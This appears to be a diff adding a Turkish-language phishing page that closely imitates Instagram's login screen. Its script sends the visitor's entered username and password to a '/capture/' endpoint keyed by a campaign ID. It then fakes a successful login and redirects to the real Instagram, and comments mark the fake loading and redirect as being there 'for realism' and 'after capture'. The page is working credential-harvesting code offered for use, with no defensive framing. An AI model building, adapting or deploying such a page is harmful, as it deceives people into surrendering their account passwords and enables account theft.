@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: #fafafa;
+            color: #262626;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .container {
+            max-width: 935px;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .login-box {
+            background-color: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+            border-radius: 1px;
+        }
+
+        .logo {
+            font-family: 'Instagram Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            font-size: 42px;
+            margin: 22px 0 36px;
+            background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 600;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 9px 12px;
+            margin: 6px 0;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #a8a8a8;
+        }
+
+        .login-btn {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 7px;
+            border-radius: 8px;
+            font-weight: 600;
+            margin: 8px 0;
+            cursor: pointer;
+            font-size: 14px;
+        }
+
+        .login-btn:hover {
+            background-color: #1877f2;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background-color: #dbdbdb;
+        }
+
+        .divider span {
+            padding: 0 18px;
+        }
+
+        .fb-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            margin: 8px 0;
+        }
+
+        .fb-login i {
+            margin-right: 8px;
+            font-size: 18px;
+        }
+
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            text-decoration: none;
+            display: block;
+            margin: 12px 0;
+        }
+
+        .signup-box {
+            margin-top: 10px;
+            padding: 25px;
+            border: 1px solid #dbdbdb;
+            background-color: white;
+            width: 350px;
+            text-align: center;
+            font-size: 14px;
+            border-radius: 1px;
+        }
+
+        .signup-box a {
+            color: #0095f6;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .app-links {
+            margin-top: 20px;
+            text-align: center;
+            width: 350px;
+        }
+
+        .app-links p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+
+        .app-stores img {
+            height: 40px;
+            margin: 0 5px;
+        }
+
+        footer {
+            max-width: 935px;
+            width: 100%;
+            margin-top: auto;
+            padding: 20px 0;
+            font-size: 12px;
+            color: #8e8e8e;
+            text-align: center;
+        }
+
+        footer a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+
+        .footer-links {
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-bottom: 12px;
+        }
+
+        .copyright {
+            margin-top: 12px;
+        }
+
+        @media (max-width: 450px) {
+            .login-box, .signup-box {
+                width: 100%;
+                border: none;
+                background-color: #fafafa;
+            }
+
+            .container {
+                padding: 0;
+            }
+        }
+
+        .loading {
+            display: none;
+            margin-top: 10px;
+        }
+
+        .spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0095f6;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <div class="logo">Instagram</div>
+
+            <form id="login-form">
+                <input type="text" id="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required>
+                <input type="password" id="password" placeholder="Şifre" required>
+
+                <button type="submit" class="login-btn">Giriş Yap</button>
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                </div>
+
+                <div class="divider">
+                    <span>YA DA</span>
+                </div>
+
+                <a href="#" class="fb-login">
+                    <i class="fab fa-facebook-square"></i> Facebook ile Giriş Yap
+                </a>
+
+                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
+            </form>
+        </div>
+    </div>
+
+    <div class="signup-box">
+        Hesabın yok mu? <a href="#">Kaydol</a>
+    </div>
+
+    <div class="app-links">
+        <p>Uygulamayı indir.</p>
+        <div class="app-stores">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play">
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-links">
+            <a href="#">Hakkında</a>
+            <a href="#">Yardım</a>
+            <a href="#">Basın</a>
+            <a href="#">API</a>
+            <a href="#">İş Fırsatları</a>
+            <a href="#">Gizlilik</a>
+            <a href="#">Koşullar</a>
+            <a href="#">Konumlar</a>
+            <a href="#">Başlıca Hesaplar</a>
+            <a href="#">Hashtag'ler</a>
+            <a href="#">Dil</a>
+        </div>
+        <div class="copyright">
+            © 2023 Instagram from Meta
+        </div>
+    </footer>
+
+    <script>
+        const campaignId = window.location.pathname.substring(1);
+
+        document.getElementById('login-form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            if (!username || !password) {
+                alert('Lütfen kullanıcı adı ve şifre girin!');
+                return;
+            }
+
+            document.getElementById('loading').style.display = 'block';
+
+            try {
+                const response = await fetch(`/capture/${campaignId}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        timestamp: new Date().toISOString(),
+                        platform: 'Instagram'
+                    })
+                });
+
+                // Fake loading for realism
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    alert('Giriş başarılı! Yönlendiriliyorsunuz...');
+
+                    // Redirect to real Instagram after capture
+                    setTimeout(() => {
+                        window.location.href = 'https://www.instagram.com/';
+                    }, 1000);
+                }, 2000);
+
+            } catch (error) {
+                document.getElementById('loading').style.display = 'none';
+                alert('Bir hata oluştu. Lütfen tekrar deneyin.');
+            }
+        });
+
+        // Simulate real Instagram behavior
+        document.addEventListener('DOMContentLoaded', function() {
+            // Auto-focus on username field
+            document.getElementById('username').focus();
+
+            // Add some realistic touches
+            const inputs = document.querySelectorAll('input');
+            inputs.forEach(input => {
+                input.addEventListener('focus', function() {
+                    this.style.borderColor = '#0095f6';
+                });
+
+                input.addEventListener('blur', function() {
+                    this.style.borderColor = '#dbdbdb';
+                });
+            });
+        });
+    </script>
+</body>
+</html>
